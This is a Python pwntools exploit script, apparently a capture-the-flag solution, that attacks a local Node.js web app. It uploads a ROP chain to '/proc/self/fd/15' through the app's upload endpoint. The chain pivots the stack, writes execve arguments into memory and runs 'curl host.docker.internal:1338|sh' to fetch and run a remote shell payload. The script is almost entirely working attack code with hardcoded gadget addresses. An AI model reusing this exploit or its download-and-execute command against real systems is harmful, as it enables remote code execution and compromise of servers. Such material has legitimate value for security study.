#!/usr/bin/env python3
import requests
from pwn import *

"""
gdb ./node
b *0x12d0004
b *0x1d32a63
run app.js
"""

HOST = "http://localhost:8000"
# host an index.html file here with your sh payload
SHELL_HOST, SHELL_PORT = "host.docker.internal", 1338

# All addresses must be valid UTF-8
PIVOT_GADGET = 0x4354c41  # -> 0x012d0000
SIGNUM = 0x4032d00  # must be equal to dword after PIVOT_GADGET
RW_SECTION = 0x61e2000
SYSCALL = 0x10e3422  # syscall
POP_RAX = 0x1201b13  # pop rax; ret
POP_RDI = 0x11e5605  # pop rdi; ret
POP_RSI = 0x146447f  # pop rsi; ret
POP_RDX = 0x12b0012  # pop rdx; ret
MOV_GADGET = 0x1211670  # mov qword ptr [rdi], rsi ; ret

context.arch = "amd64"


def upload(filename, content):
    r = requests.post(HOST + "/upload",
                      json={"filename": filename, "content": content})
    print(r.text)


def gadget_write_at(addr, qword):
    if isinstance(qword, bytes):
        if len(qword) > 8:
            raise ValueError("qword cannot be larger than 8 bytes")
        qword = qword.ljust(8, b"\x00")
    yield POP_RDI
    yield addr
    yield POP_RSI
    yield qword
    yield MOV_GADGET


def gadget_create_string(addr, s):
    s = s.encode() + b"\x00"
    for i in range(0, len(s), 8):
        yield from gadget_write_at(addr + i, s[i:i+8])


if __name__ == "__main__":
    argv = [RW_SECTION+0x100, RW_SECTION+0x200, RW_SECTION+0x300]
    argv_arr = RW_SECTION

    content = flat([
        # Start ROP chain
        PIVOT_GADGET,
        SIGNUM,

        # Write execve() arguments
        *gadget_create_string(argv[0], "/bin/sh"),
        *gadget_create_string(argv[1], "-c"),
        *gadget_create_string(argv[2], f"curl {SHELL_HOST}:{SHELL_PORT}|sh"),
        #! Warning: due to limited chain size, the command needs to be pretty short

        # Create argv[] array
        *gadget_write_at(argv_arr, argv[0]),
        *gadget_write_at(argv_arr + 8, argv[1]),
        *gadget_write_at(argv_arr + 16, argv[2]),

        # Run execve syscall
        POP_RAX,
        constants.SYS_execve,
        POP_RDI,
        argv[0],
        POP_RSI,
        argv_arr,
        POP_RDX,
        0,
        SYSCALL,
    ])

    upload("/proc/self/fd/15", content.decode())
